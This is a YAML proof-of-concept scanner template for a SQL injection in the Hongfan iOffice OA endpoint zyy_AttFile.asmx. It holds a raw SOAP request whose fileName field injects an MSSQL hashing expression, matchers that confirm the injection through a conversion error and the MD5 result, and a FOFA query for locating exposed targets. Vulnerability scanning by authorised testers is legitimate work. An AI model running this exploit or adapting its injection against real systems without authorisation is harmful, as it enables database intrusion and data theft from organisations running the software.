folder-6/poc-yaml-hongfan-ioffice-zyy-attfile-asmx-sqli.yaml

id: poc-yaml-hongfan-ioffice-zyy-attfile-asmx-sqli
info:
  name: 红帆OA zyy_AttFile.asmx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: iOffice
    fofa: app="红帆-ioffice"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://tempuri.org/GetFileAtt"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetFileAtt xmlns="http://tempuri.org/">
              <fileName>1231=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))</fileName>
            </GetFileAtt>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "nvarchar"
          - "转换成数据类型 int 时失败"
      - type: dsl
        dsl:
          - contains(http_body, t2)
